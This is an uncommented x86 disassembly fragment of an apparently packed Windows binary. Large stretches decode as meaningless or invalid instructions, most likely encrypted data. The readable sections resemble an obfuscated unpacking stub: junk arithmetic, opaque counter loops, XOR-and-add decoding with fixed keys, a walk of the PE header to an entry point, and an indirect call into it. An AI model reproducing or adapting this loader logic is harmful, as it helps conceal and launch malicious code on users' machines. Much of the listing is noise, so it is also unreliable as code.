  40614a:	iret   
  40614b:	mov    ds:0x11ef97d4,al
  406150:	out    0xfa,al
  406152:	xchg   DWORD PTR [ebx+0x4a],edx
  406155:	xchg   esp,eax
  406156:	mov    ebp,0x84cf4ac1
  40615b:	jo     0x406156
  40615d:	sub    DWORD PTR [esi+0x145aa251],ebx
  406163:	or     ebp,0x75
  406166:	dec    edi
  406167:	sub    ah,BYTE PTR [eax]
  406169:	push   ecx
  40616a:	sub    eax,0x4fc2c16
  40616f:	dec    esp
  406170:	xchg   ecx,eax
  406171:	pop    ecx
  406172:	ficom  WORD PTR [esp+ebp*8+0x1]
  406176:	or     eax,0x489fe4a4
  40617b:	mov    ebp,0xcf97c8eb
  406180:	pop    edi
  406181:	cs pusha 
  406183:	loop   0x40613d
  406185:	pushf  
  406186:	ds cs sar bl,1
  40618a:	sub    BYTE PTR [ebp-0x1db6f90d],bh
  406190:	push   0x10
  406192:	cli    
  406193:	lea    ebp,[esi-0x46]
  406196:	scas   al,BYTE PTR es:[edi]
  406197:	rcr    BYTE PTR [ecx],1
  406199:	xor    di,WORD PTR [esi-0x4155dfc3]
  4061a0:	adc    BYTE PTR [edx],bl
  4061a2:	xor    bh,BYTE PTR [ebp-0x413ee8f7]
  4061a8:	jmp    0x40615c
  4061aa:	ror    DWORD PTR [esi+0x4c],1
  4061ad:	mov    edi,0x29479b9
  4061b2:	test   BYTE PTR [eax-0xdfa4017],ch
  4061b8:	xor    BYTE PTR [ebx],bh
  4061ba:	xchg   ebx,eax
  4061bb:	gs retf 
  4061bd:	adc    al,0xc2
  4061bf:	idiv   DWORD PTR [edx+edi*2]
  4061c2:	pop    ecx
  4061c3:	jae    0x4061dc
  4061c5:	rcl    BYTE PTR [esi+0x77],0x10
  4061c9:	fstp   QWORD PTR [ebp+0x75]
  4061cc:	and    eax,0xda21f75e
  4061d1:	and    ah,dl
  4061d3:	pusha  
  4061d4:	sbb    eax,0x36bd4804
  4061d9:	popa   
  4061da:	pusha  
  4061db:	rol    BYTE PTR [edi+edx*8],1
  4061de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061df:	stos   DWORD PTR es:[edi],eax
  4061e0:	ins    BYTE PTR es:[edi],dx
  4061e1:	jecxz  0x406197
  4061e3:	mov    eax,0xebed288
  4061e8:	shl    DWORD PTR [ebx+esi*2-0x40],1
  4061ec:	jp     0x4061bc
  4061ee:	push   edx
  4061ef:	sub    al,0xe1
  4061f1:	sbb    eax,0xf8391b2d
  4061f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061f7:	icebp  
  4061f8:	retf   
  4061f9:	(bad)  
  4061fb:	icebp  
  4061fc:	xchg   DWORD PTR [ebp+0x3e],ecx
  4061ff:	or     al,0xdc
  406201:	scas   eax,DWORD PTR es:[edi]
  406202:	(bad)  
  406204:	das    
  406205:	fs call 0xec4f:0xf70358fe
  40620d:	fs ja  0x4061b1
  406210:	les    edx,FWORD PTR [esi-0x70]
  406213:	retf   0xb249
  406216:	(bad)  
  406217:	fisttp WORD PTR [edx+0x5f39961a]
  40621d:	mov    DWORD PTR [ebp+0x18355382],ecx
  406223:	add    eax,0xa1781323
  406228:	mov    bh,0x1f
  40622a:	or     al,0x7f
  40622c:	add    BYTE PTR [esi-0x34],al
  40622f:	push   0x61
  406231:	cmp    eax,0xb3408621
  406236:	dec    ebp
  406237:	dec    edx
  406238:	pushf  
  406239:	scas   al,BYTE PTR es:[edi]
  40623a:	xor    edi,eax
  40623c:	push   esi
  40623d:	mov    esp,0xfd43b90e
  406242:	mov    es,WORD PTR [esi+0x44]
  406245:	add    eax,DWORD PTR ds:[eax+eax*1-0x77]
  40624a:	jns    0x406294
  40624c:	pop    ebx
  40624d:	inc    ebx
  40624e:	rcl    DWORD PTR [ecx+0x6d],0x8a
  406252:	sub    eax,0x355e6abf
  406257:	mov    ebp,0x9544a027
  40625c:	fs mov eax,0x981b75f
  406262:	mov    ds:0x81f0334e,al
  406267:	and    eax,0x433823
  40626c:	add    BYTE PTR [eax],al
  40626e:	add    BYTE PTR [eax],al
  406270:	jmp    0x406282
  406275:	mov    ecx,DWORD PTR ds:0x433823
  40627b:	inc    ecx
  40627c:	mov    DWORD PTR ds:0x433823,ecx
  406282:	cmp    DWORD PTR ds:0x433823,0x1d
  406289:	jae    0x4062c6
  40628f:	cmp    DWORD PTR ds:0x433823,0xb
  406296:	jne    0x4062a7
  40629c:	push   0x3d1a
  4062a1:	call   DWORD PTR ds:0x4120c8
  4062a7:	cmp    DWORD PTR ds:0x433823,0xa
  4062ae:	jne    0x4062c1
  4062b4:	mov    ecx,DWORD PTR ds:0x433823
  4062ba:	inc    ecx
  4062bb:	mov    DWORD PTR ds:0x433823,ecx
  4062c1:	jmp    0x406275
  4062c6:	mov    eax,DWORD PTR [edx+0x194]
  4062cc:	mov    ecx,DWORD PTR [eax]
  4062ce:	mov    eax,DWORD PTR [ecx+0x3c]
  4062d1:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4062d5:	add    eax,ecx
  4062d7:	mov    DWORD PTR [ebp+0x8],esi
  4062da:	mov    DWORD PTR [ebp+0x10],eax
  4062dd:	mov    eax,DWORD PTR [ebp+0x10]
  4062e0:	pop    esi
  4062e1:	test   eax,eax
  4062e3:	je     0x406656
  4062e9:	push   DWORD PTR ds:0x413c0c
  4062ef:	push   DWORD PTR ds:0x4139b8
  4062f5:	mov    eax,DWORD PTR [edx+0x194]
  4062fb:	push   DWORD PTR [eax]
  4062fd:	mov    eax,DWORD PTR [ebp+0x10]
  406300:	jmp    0x40664f
  406305:	lahf   
  406306:	cmp    al,0x1a
  406308:	push   ds
  406309:	pop    ecx
  40630a:	fcomp  DWORD PTR [ebx-0x2e0ee343]
  406310:	cmc    
  406311:	sahf   
  406312:	ins    BYTE PTR es:[edi],dx
  406313:	fist   WORD PTR fs:[edi+edi*1+0x7e]
  406318:	jle    0x406346
  40631a:	jge    0x40639a
  40631c:	jle    0x406314
  40631e:	ds stos BYTE PTR es:[edi],al
  406320:	adc    eax,0x44d31462
  406325:	cs dec eax
  406327:	sete   BYTE PTR [eax-0x497bd7b6]
  40632e:	inc    edx
  40632f:	sub    dh,BYTE PTR [eax+0x75ce934d]
  406335:	or     eax,0x66ae2fff
  40633a:	xchg   edi,eax
  40633b:	ror    DWORD PTR [ecx],1
  40633d:	jl     0x4062f3
  40633f:	imul   ebp,DWORD PTR [ebx+0x7f],0x2a
  406343:	add    dh,BYTE PTR [eax-0x30f3c9c0]
  406349:	(bad)  
  40634a:	scas   al,BYTE PTR es:[edi]
  40634b:	sbb    dh,cl
  40634d:	xor    BYTE PTR [eax+eax*1+0x75b40ba7],bl
  406354:	mov    edx,0xf3d0fd46
  406359:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40635a:	imul   ebp,DWORD PTR [ecx-0x7b],0x76
  40635e:	adc    BYTE PTR [ecx],ch
  406360:	aaa    
  406361:	pop    esp
  406362:	fcomp  DWORD PTR [edi]
  406364:	inc    ebx
  406365:	mov    ecx,cs
  406367:	jno    0x406359
  406369:	push   ebp
  40636a:	add    edi,DWORD PTR [ebp-0x20]
  40636d:	retf   
  40636e:	out    dx,al
  40636f:	je     0x406379
  406371:	dec    edi
  406372:	test   dl,0xc4
  406375:	adc    bl,0xec
  406378:	jo     0x406328
  40637a:	hlt    
  40637b:	xchg   edx,eax
  40637c:	mov    BYTE PTR [edi],dh
  40637e:	mul    edi
  406380:	sbb    dl,BYTE PTR [eax-0x12]
  406383:	retf   
  406384:	call   0x12ebfd73
  406389:	pop    edi
  40638a:	pop    ebx
  40638b:	jbe    0x406397
  40638d:	jbe    0x4063a0
  40638f:	xchg   ecx,eax
  406390:	and    al,BYTE PTR [esi-0x7f]
  406393:	xor    al,0x8d
  406396:	scas   eax,DWORD PTR es:[edi]
  406397:	xor    eax,0x4c4c00ad
  40639c:	fwait
  40639d:	arpl   WORD PTR [ecx],di
  40639f:	shl    al,0xe0
  4063a2:	ror    DWORD PTR [esi],cl
  4063a4:	in     eax,0x62
  4063a6:	iret   
  4063a7:	je     0x406428
  4063a9:	dec    edi
  4063aa:	sbb    ebp,eax
  4063ac:	xchg   BYTE PTR [edx+0x7140f472],dl
  4063b2:	mov    gs:0x3feecb05,eax
  4063b8:	mov    al,0x5a
  4063ba:	fld    st(4)
  4063bc:	xor    al,BYTE PTR [ecx+0x7dcf4ee4]
  4063c2:	mov    esp,0x3fde93fe
  4063c7:	aad    0x28
  4063c9:	pop    ecx
  4063ca:	add    edi,ecx
  4063cc:	pop    esp
  4063cd:	push   edx
  4063ce:	cmp    al,0x1
  4063d0:	xor    BYTE PTR [edi+ebx*4+0x3a],bl
  4063d4:	arpl   WORD PTR ds:0x8ac745c2,cx
  4063da:	mov    edi,cs
  4063dc:	jne    0x4063e7
  4063de:	out    dx,al
  4063df:	cmp    al,0xcc
  4063e1:	dec    esi
  4063e2:	pop    eax
  4063e3:	int    0x6f
  4063e5:	dec    edx
  4063e6:	enter  0x6bb5,0x9c
  4063ea:	in     al,dx
  4063eb:	pop    ds
  4063ec:	push   0x4de1564d
  4063f1:	pop    ss
  4063f2:	push   ds
  4063f3:	or     eax,0xb74cf43d
  4063f8:	pop    ss
  4063f9:	imul   ebp
  4063fb:	dec    ebp
  4063fc:	outs   dx,DWORD PTR ds:[esi]
  4063fd:	mov    dl,0xc2
  4063ff:	enter  0xe393,0x5c
  406403:	data16 jne 0x406485
  406406:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406407:	and    al,0xca
  406409:	cld    
  40640a:	ins    DWORD PTR es:[edi],dx
  40640b:	or     BYTE PTR [esi+0x2b],bh
  40640e:	ss retf 0x97a
  406412:	push   esp
  406413:	and    edi,edx
  406415:	pushf  
  406416:	shr    BYTE PTR [ebp+ebx*2+0x6c],0x50
  40641b:	xchg   DWORD PTR [ecx+0x78],esi
  40641e:	ret    
  40641f:	or     DWORD PTR [esi],esp
  406421:	mov    ss,WORD PTR [ebp-0x17]
  406424:	cmp    al,0xf0
  406426:	(bad)  
  406427:	js     0x4063bb
  406429:	aas    
  40642a:	adc    ch,bh
  40642c:	mov    WORD PTR [esi+0x5c],ds
  40642f:	rcr    DWORD PTR [esi+esi*4],0xe1
  406433:	dec    BYTE PTR [eax+0x9c1d53a]
  406439:	loopne 0x40645f
  40643b:	in     al,dx
  40643c:	(bad)  
  40643d:	pop    es
  40643e:	dec    eax
  40643f:	stc    
  406440:	add    BYTE PTR [esi],ah
  406442:	test   al,0x13
  406444:	and    bh,bl
  406446:	ss mov ah,0x9f
  406449:	and    DWORD PTR [esi-0x1a],eax
  40644c:	push   esp
  40644d:	adc    al,0xb3
  40644f:	cli    
  406450:	sbb    eax,0xf2b2f63b
  406455:	xlat   BYTE PTR ds:[ebx]
  406456:	repz cwde 
  406458:	add    eax,0x80128012
  40645d:	jmp    0x406470
  40645f:	sbb    dh,BYTE PTR [ecx-0x407edb57]
  406465:	adc    BYTE PTR [ebp+0x15],ch
  406468:	jbe    0x40648a
  40646a:	retf   0xdc40
  40646d:	scas   al,BYTE PTR es:[edi]
  40646e:	xchg   ebp,eax
  40646f:	pop    es
  406470:	(bad)  
  406472:	sbb    BYTE PTR [ecx+0x54],cl
  406475:	leave  
  406476:	jbe    0x40640d
  406478:	or     al,0x37
  40647a:	out    dx,eax
  40647b:	add    eax,0x1ad79a9e
  406480:	jo     0x4064eb
  406482:	mov    edx,0x146aca59
  406487:	(bad)  
  406488:	xchg   DWORD PTR [ecx-0xd],ebp
  40648b:	jl     0x40648d
  40648d:	mov    eax,ds:0x3a3077dd
  406492:	dec    ebx
  406493:	inc    edi
  406494:	inc    esi
  406495:	mov    bh,0x3d
  406497:	test   BYTE PTR ds:[ecx-0x6eabc7f6],dh
  40649e:	fsub   st,st(5)
  4064a0:	das    
  4064a1:	int3   
  4064a2:	mov    al,ds:0xec3cb1f4
  4064a7:	inc    edx
  4064a8:	lahf   
  4064a9:	in     eax,dx
  4064aa:	adc    al,0x6
  4064ac:	cs sbb al,0x9b
  4064af:	pushf  
  4064b0:	fnstsw WORD PTR [eax]
  4064b2:	call   0x50826c0c
  4064b7:	mov    dh,dh
  4064b9:	fld    QWORD PTR [esi-0x3d]
  4064bc:	and    ebx,DWORD PTR [edi+0xbe9988e]
  4064c2:	pop    edi
  4064c3:	cmove  ebp,edx
  4064c6:	push   ebp
  4064c7:	or     DWORD PTR [eax],eax
  4064c9:	popf   
  4064ca:	adc    edx,DWORD PTR [edx-0x4bb86809]
  4064d0:	stc    
  4064d1:	lods   eax,DWORD PTR ds:[esi]
  4064d2:	cmp    DWORD PTR [ebp-0x43],eax
  4064d5:	std    
  4064d6:	jmp    0x42a:0xf003ff74
  4064dd:	jno    0x406530
  4064df:	jb     0x40655d
  4064e1:	hlt    
  4064e2:	dec    esp
  4064e3:	stos   BYTE PTR es:[edi],al
  4064e4:	sub    al,0x69
  4064e6:	shr    DWORD PTR [eax],0xd3
  4064e9:	test   dl,al
  4064eb:	sti    
  4064ec:	cmpxchg DWORD PTR [esi],ebp
  4064ef:	out    dx,eax
  4064f0:	ret    0xe395
  4064f3:	fild   DWORD PTR [esi-0x55b81deb]
  4064f9:	mov    edi,DWORD PTR [esi+0x0]
  4064fc:	sti    
  4064fd:	xor    edx,eax
  4064ff:	fcom   QWORD PTR [esi+0x8927711]
  406505:	mov    edi,0x8abca213
  40650a:	mov    esp,0x93aaa3b7
  40650f:	xchg   edi,eax
  406510:	fcomi  st,st(6)
  406512:	or     DWORD PTR [esp+esi*8+0x64],ebx
  406516:	mov    al,ds:0x59f82c9b
  40651b:	test   BYTE PTR [edx-0x46],bh
  40651e:	fsubrp st(0),st
  406520:	lahf   
  406521:	jne    0x406595
  406523:	lock imul ecx,esi,0x3a
  406527:	mov    cl,0x3e
  406529:	xchg   ecx,eax
  40652a:	addr16 push ebx
  40652c:	push   edx
  40652d:	pop    eax
  40652e:	dec    esp
  40652f:	(bad)  
  406530:	jno    0x40654b
  406532:	in     eax,0x80
  406534:	jle    0x40658f
  406536:	mov    cl,BYTE PTR [esi-0x69685220]
  40653c:	xor    DWORD PTR [edx-0x22899a80],0x1d
  406543:	add    bl,BYTE PTR [esi]
  406545:	dec    eax
  406546:	xor    dl,BYTE PTR [edi-0x5c]
  406549:	nop
  40654a:	aas    
  40654b:	into   
  40654c:	clc    
  40654d:	test   DWORD PTR [eax-0x77fabc38],ecx
  406553:	xchg   ecx,eax
  406554:	sub    BYTE PTR [ebp+0x62],bh
  406557:	push   0xfffffffb
  406559:	mov    DWORD PTR [edx+0x35],esi
  40655c:	pop    eax
  40655d:	push   ds
  40655e:	daa    
  40655f:	and    BYTE PTR [edx-0x31],0xbc
  406563:	sub    eax,0x6f7217f7
  406568:	push   cs
  406569:	push   ss
  40656a:	mov    edi,0x7abb6f8f
  40656f:	jmp    0x5bb37d11
  406574:	jge    0x4065c1
  406576:	sbb    edi,DWORD PTR [eax+0x5b0127b3]
  40657c:	fidivr DWORD PTR [ebx]
  40657e:	mov    ch,0xda
  406580:	in     eax,0xde
  406582:	lods   al,BYTE PTR ds:[esi]
  406583:	xor    DWORD PTR [esi],0x7fddf7b9
  406589:	(bad)  
  40658b:	fwait
  40658c:	aad    0xe3
  40658e:	mov    ebp,0x308782d4
  406593:	jmp    0x40656b
  406595:	dec    edi
  406596:	mov    cl,0x23
  406598:	out    dx,al
  406599:	in     ax,dx
  40659b:	out    0x18,eax
  40659d:	data16 mov bl,0x53
  4065a0:	push   esi
  4065a1:	push   0xffffffa6
  4065a3:	inc    edx
  4065a4:	sub    edi,eax
  4065a6:	pop    edi
  4065a7:	or     ecx,ebx
  4065a9:	mov    ebx,0xc69589d0
  4065ae:	or     bl,bl
  4065b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065b1:	sub    ecx,DWORD PTR ds:0x5a2a1ec5
  4065b7:	je     0x4065cc
  4065b9:	fnsave [edi]
  4065bb:	pop    eax
  4065bc:	rcl    BYTE PTR [edx-0x37c61bb9],0xe1
  4065c3:	sbb    dl,bh
  4065c5:	repz cli 
  4065c7:	push   edi
  4065c8:	cmc    
  4065c9:	sbb    edx,DWORD PTR [eax]
  4065cb:	scas   al,BYTE PTR es:[edi]
  4065cc:	cmp    al,0x47
  4065ce:	ds cwde 
  4065d0:	add    ebx,DWORD PTR [eax+0x6439e016]
  4065d6:	add    DWORD PTR [edi],edx
  4065d8:	in     eax,dx
  4065d9:	fwait
  4065da:	or     eax,0x934e245a
  4065df:	cmp    BYTE PTR [edx+0xa2258ab],al
  4065e5:	push   0x63
  4065e7:	push   cs
  4065e8:	mov    al,0xe0
  4065ea:	cmp    ecx,DWORD PTR [ecx+0x5d107d09]
  4065f0:	sbb    al,0x9e
  4065f2:	fimul  WORD PTR [edi+esi*4]
  4065f5:	rcl    BYTE PTR [esi+esi*8],1
  4065f8:	aad    0x33
  4065fa:	repz mov ds,eax
  4065fd:	mov    edx,DWORD PTR [edx]
  4065ff:	jecxz  0x4065e7
  406601:	push   eax
  406602:	sub    BYTE PTR [ebp-0x2ca5cd59],dl
  406608:	adc    BYTE PTR ds:0x42a3a521,0x83
  40660f:	mov    ebp,0xe1e702af
  406614:	xor    al,0x50
  406616:	push   0xe
  406618:	jmp    0x217f:0xa3167ad1
  40661f:	fisttp QWORD PTR [esi-0x76]
  406622:	gs out dx,al
  406624:	shl    DWORD PTR [esi+0x28ddf29d],1
  40662a:	cwde   
  40662b:	push   ebp
  40662c:	mov    dl,0x2f
  40662e:	jae    0x406670
  406630:	mov    dl,0x62
  406632:	mov    ecx,0xbf12d35f
  406637:	add    esp,edx
  406639:	dec    esi
  40663a:	test   DWORD PTR [ecx+eax*1-0x35],edx
  40663e:	pop    edx
  40663f:	adc    al,0x54
  406641:	adc    ebx,DWORD PTR [ecx+0x7b]
  406644:	cmp    ah,BYTE PTR ds:0x522c8773
  40664a:	repnz pop ss
  40664c:	push   ecx
  40664d:	sti    
  40664e:	es call eax
  406651:	jmp    0x406659
  406656:	mov    eax,DWORD PTR [ebp+0x10]
  406659:	leave  
  40665a:	ret    0xc
  40665d:	push   ebp
  40665e:	mov    ebp,esp
  406660:	sub    esp,0x28
  406663:	push   0x413cb4
  406668:	call   DWORD PTR ds:0x412408
  40666e:	mov    DWORD PTR ds:0x4336fb,0x6571
  406678:	cmp    WORD PTR [eax],0x0
  40667c:	jne    0x406afe
  406682:	push   0x413d04
  406687:	call   DWORD PTR ds:0x412404
  40668d:	mov    DWORD PTR ds:0x4337d3,0x5ed5
  406697:	cmp    BYTE PTR [eax],0x0
  40669a:	mov    DWORD PTR ds:0x4337a7,0x18c3
  4066a4:	jne    0x406b09
  4066aa:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4066b1:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4066b8:	lea    eax,[ebp-0x20]
  4066bb:	mov    DWORD PTR [ebp-0x14],eax
  4066be:	lea    eax,[ebp-0x1c]
  4066c1:	and    DWORD PTR ds:0x4337e3,0x0
  4066cb:	mov    ecx,DWORD PTR ds:0x4337e3
  4066d1:	inc    ecx
  4066d2:	mov    DWORD PTR ds:0x4337e3,ecx
  4066d8:	cmp    DWORD PTR ds:0x4337e3,0x5
  4066df:	jne    0x4066f8
  4066e5:	push   0x2ad8
  4066ea:	push   DWORD PTR [ebp-0x1c]
  4066ed:	push   0x433903
  4066f2:	call   DWORD PTR ds:0x412340
  4066f8:	cmp    DWORD PTR ds:0x4337e3,0x4
  4066ff:	jne    0x406714
  406705:	xor    ecx,ecx
  406707:	or     ecx,DWORD PTR ds:0x4337e3
  40670d:	inc    ecx
  40670e:	mov    DWORD PTR ds:0x4337e3,ecx
  406714:	cmp    DWORD PTR ds:0x4337e3,0x1f
  40671b:	jb     0x4066cb
  406721:	movzx  ecx,WORD PTR ds:0x4337d7
  406728:	and    ecx,DWORD PTR ds:0x43370f
  40672e:	mov    DWORD PTR ds:0x4337d7,ecx
  406734:	mov    DWORD PTR [ebp-0x10],eax
  406737:	adc    DWORD PTR ds:0x43371b,ecx
  40673d:	mov    eax,ds:0x413b34
  406742:	sbb    ecx,DWORD PTR ds:0x43382b
  406748:	mov    eax,DWORD PTR [eax+0x1c8]
  40674e:	mov    eax,DWORD PTR [eax]
  406750:	sub    DWORD PTR ds:0x433713,ebx
  406756:	mov    ecx,DWORD PTR [ebp-0x10]
  406759:	push   ebx
  40675a:	xor    DWORD PTR ds:0x43376b,edx
  406760:	push   esi
  406761:	and    DWORD PTR ds:0x433707,0x0
  40676b:	jmp    0x40677d
  406770:	mov    ebx,DWORD PTR ds:0x433707
  406776:	inc    ebx
  406777:	mov    DWORD PTR ds:0x433707,ebx
  40677d:	cmp    DWORD PTR ds:0x433707,0x1b
  406784:	jae    0x4067ac
  40678a:	cmp    DWORD PTR ds:0x433707,0x23
  406791:	jne    0x4067a7
  406797:	push   0x433933
  40679c:	push   DWORD PTR [ebp-0x18]
  40679f:	push   0x0
  4067a1:	call   DWORD PTR ds:0x412344
  4067a7:	jmp    0x406770
  4067ac:	mov    esi,0x7510854
  4067b1:	sub    DWORD PTR ds:0x4337ab,0x6a10
  4067bb:	xor    eax,esi
  4067bd:	adc    DWORD PTR ds:0x433797,0x4337a7
  4067c7:	push   edi
  4067c8:	mov    edi,0x32729b
  4067cd:	add    eax,edi
  4067cf:	mov    ebx,0x337e
  4067d4:	mov    DWORD PTR [ecx],eax
  4067d6:	mov    eax,ds:0x413e08
  4067db:	cmp    eax,0x23c13046
  4067e0:	mov    eax,DWORD PTR [ebp-0x4]
  4067e3:	mov    ebx,0xf89c853d
  4067e8:	je     0x406824
  4067ee:	or     ecx,DWORD PTR ds:0x4337d3
  4067f4:	mov    ecx,DWORD PTR [ebp-0x8]
  4067f7:	sbb    DWORD PTR ds:0x43376b,0x4ed6
  406801:	xor    eax,esi
  406803:	add    eax,edi
  406805:	sbb    DWORD PTR ds:0x433713,0x43379f
  40680f:	imul   eax,ecx
  406812:	mov    DWORD PTR [ebp-0x8],eax
  406815:	mov    DWORD PTR ds:0x433707,0x49d5
  40681f:	jmp    0x4068d7
  406824:	or     ecx,DWORD PTR ds:0x4337af
  40682a:	xor    eax,esi
  40682c:	and    ecx,0x6df5
  406832:	add    eax,edi
  406834:	xor    ecx,ecx
  406836:	add    ecx,DWORD PTR ds:0x4337e3
  40683c:	and    DWORD PTR ds:0x4337a7,ecx
  406842:	mov    ds:0x413c48,eax
  406847:	mov    ecx,DWORD PTR ds:0x43382b
  40684d:	or     DWORD PTR ds:0x4337e3,ecx
  406853:	mov    eax,DWORD PTR [ebp-0x8]
  406856:	add    DWORD PTR ds:0x43375b,0x62ed
  406860:	xor    eax,esi
  406862:	and    DWORD PTR ds:0x43381f,ebx
  406868:	add    eax,edi
  40686a:	mov    ecx,DWORD PTR ds:0x4337ab
  406870:	sub    DWORD PTR ds:0x4337d3,ecx
  406876:	mov    ds:0x413e08,eax
  40687b:	sbb    ecx,ecx
  40687d:	mov    eax,DWORD PTR [ebp-0x4]
  406880:	and    DWORD PTR ds:0x43370b,ecx
  406886:	mov    ecx,DWORD PTR ds:0x413c48
  40688c:	sbb    DWORD PTR ds:0x433707,0x486c
  406896:	xor    eax,esi
  406898:	adc    DWORD PTR ds:0x433713,0x6147
  4068a2:	add    eax,edi
  4068a4:	cmp    ecx,eax
  4068a6:	mov    DWORD PTR ds:0x43370f,0x4c28
  4068b0:	jne    0x4068d7
  4068b6:	sub    DWORD PTR ds:0x433723,0x43382b
  4068c0:	push   ebx
  4068c1:	or     DWORD PTR ds:0x43379b,0x4337df
  4068cb:	push   DWORD PTR [ebp-0x4]
  4068ce:	push   DWORD PTR [ebp-0x8]
  4068d1:	call   DWORD PTR ds:0x413c40
  4068d7:	mov    eax,ds:0x413b34
  4068dc:	mov    eax,DWORD PTR [eax+0x18c]
  4068e2:	and    DWORD PTR ds:0x4337e7,0x433793
  4068ec:	mov    eax,DWORD PTR [eax]
  4068ee:	mov    DWORD PTR [ebp-0x18],eax
  4068f1:	mov    DWORD PTR [ebp-0x10],ebx
  4068f4:	or     DWORD PTR ds:0x433753,0x1d95
  4068fe:	mov    DWORD PTR [ebp-0x10],ebx
  406901:	sub    DWORD PTR ds:0x43375b,0x4337ef
  40690b:	mov    DWORD PTR [ebp-0x10],ebx
  40690e:	sub    DWORD PTR ds:0x4337ab,0x43376f
  406918:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40691f:	and    DWORD PTR ds:0x43375b,0x43379b
  406929:	mov    DWORD PTR [ebp-0x28],ebx
  40692c:	dec    DWORD PTR ds:0x4336fb
  406932:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  406939:	mov    ebx,DWORD PTR [ebp-0x8]
  40693c:	adc    DWORD PTR ds:0x4336fb,0x433723
  406946:	xor    ebx,esi
  406948:	add    ebx,edi
  40694a:	jmp    0x4069ee
  40694f:	not    DWORD PTR ds:0x4337db
  406955:	mov    eax,DWORD PTR [ebp-0x4]
  406958:	xor    eax,esi
  40695a:	lea    eax,[eax+ebx*1+0x32729b]
  406961:	push   eax
  406962:	mov    eax,DWORD PTR [ebp-0x10]
  406965:	xor    eax,esi
  406967:	lea    eax,[ebp+eax*1+0x3272a3]
  40696e:	push   eax
  40696f:	adc    DWORD PTR ds:0x4336ff,0x8003
  406979:	mov    eax,ds:0x413b34
  40697e:	xor    DWORD PTR ds:0x4337ef,0x2bd0
  406988:	push   DWORD PTR [eax+0x1bc]
  40698e:	call   0x40f058
  406993:	mov    eax,DWORD PTR [ebp-0x4]
  406996:	add    ecx,0x2fd0
  40699c:	xor    eax,esi
  40699e:	and    DWORD PTR ds:0x43381b,0x0
  4069a8:	mov    ecx,DWORD PTR ds:0x43381b
  4069ae:	inc    ecx
  4069af:	mov    DWORD PTR ds:0x43381b,ecx
  4069b5:	cmp    DWORD PTR ds:0x43381b,0x17
  4069bc:	jne    0x4069c8
  4069c2:	call   DWORD PTR ds:0x4120cc
  4069c8:	cmp    DWORD PTR ds:0x43381b,0x11
  4069cf:	jb     0x4069a8
  4069d5:	mov    ecx,DWORD PTR ds:0x433797
  4069db:	adc    ecx,DWORD PTR ds:0x43375f
  4069e1:	mov    DWORD PTR ds:0x433797,ecx
  4069e7:	lea    ebx,[ebx+eax*1+0x32729b]
  4069ee:	mov    eax,DWORD PTR [ebp-0x4]
  4069f1:	mov    ecx,DWORD PTR [ebp-0x4]
  4069f4:	xor    ecx,esi
  4069f6:	xor    eax,esi
  4069f8:	add    eax,ecx
  4069fa:	mov    ecx,DWORD PTR [ebp-0x4]
  4069fd:	xor    ecx,esi
  4069ff:	lea    eax,[eax+ecx*1+0x9757d1]
  406a06:	cmp    ebx,eax
  406a08:	jbe    0x40694f
  406a0e:	mov    eax,DWORD PTR [ebp+0xc]
  406a11:	mov    ds:0x4139b8,eax
  406a16:	mov    eax,DWORD PTR [ebp+0x10]
  406a19:	mov    ds:0x413c0c,eax
  406a1e:	mov    eax,ds:0x4139b8
  406a23:	mov    ecx,DWORD PTR [ebp-0x14]
  406a26:	push   DWORD PTR [ebp-0x18]
  406a29:	sub    eax,edi
  406a2b:	push   DWORD PTR [ebp-0x1c]
  406a2e:	xor    eax,esi
  406a30:	mov    DWORD PTR [ecx],eax
  406a32:	push   DWORD PTR [ebp-0x20]
  406a35:	call   0x40d59f
  406a3a:	sub    eax,edi
  406a3c:	xor    eax,esi
  406a3e:	mov    DWORD PTR [ebp+0xc],eax
  406a41:	mov    ecx,DWORD PTR [ebp-0x4]
  406a44:	mov    eax,DWORD PTR [ebp+0xc]
  406a47:	xor    ecx,esi
  406a49:	add    ecx,edi
  406a4b:	xor    edx,edx
  406a4d:	div    ecx
  406a4f:	mov    ecx,DWORD PTR [ebp-0x8]
  406a52:	cmp    ecx,eax
  406a54:	jne    0x406a5f
  406a5a:	call   0x401000
  406a5f:	lea    eax,[ebp+0x4]
  406a62:	mov    DWORD PTR [ebp-0x24],eax
  406a65:	mov    eax,ds:0x413b34
  406a6a:	push   0x4
  406a6c:	add    eax,0x1cc
  406a71:	push   eax
  406a72:	lea    eax,[ebp-0xc]
  406a75:	push   eax
  406a76:	call   0x40f058
  406a7b:	mov    eax,DWORD PTR [ebp-0xc]
  406a7e:	mov    eax,DWORD PTR [ebp-0x4]
  406a81:	mov    eax,DWORD PTR [ebp-0x8]
  406a84:	mov    DWORD PTR [ebp+0xc],eax
  406a87:	mov    eax,ds:0x413bb8
  406a8c:	mov    ecx,DWORD PTR [ebp+0xc]
  406a8f:	sub    eax,edi
  406a91:	xor    eax,esi
  406a93:	cmp    eax,ecx
  406a95:	je     0x406adc
  406a9b:	mov    eax,ds:0x413bb0
  406aa0:	mov    ecx,DWORD PTR [ebp+0xc]
  406aa3:	sub    eax,edi
  406aa5:	xor    eax,esi
  406aa7:	cmp    eax,ecx
  406aa9:	jne    0x406abf
  406aaf:	mov    eax,ds:0x413bb8
  406ab4:	add    eax,DWORD PTR ds:0x413bb0
  406aba:	jmp    0x406ac6
  406abf:	mov    eax,DWORD PTR [ebp+0xc]
  406ac2:	xor    eax,esi
  406ac4:	add    eax,edi
  406ac6:	mov    ds:0x413bb0,eax
  406acb:	mov    eax,DWORD PTR [ebp+0xc]
  406ace:	xor    eax,esi
  406ad0:	add    eax,edi
  406ad2:	mov    ds:0x413bb8,eax
  406ad7:	jmp    0x406ae6
  406adc:	mov    eax,ds:0x413bb8
  406ae1:	mov    ds:0x413bb0,eax
  406ae6:	mov    eax,DWORD PTR [ebp-0x24]
  406ae9:	mov    ecx,DWORD PTR ds:0x413bb0
  406aef:	add    DWORD PTR [eax],ecx
  406af1:	mov    eax,DWORD PTR [ebp-0xc]
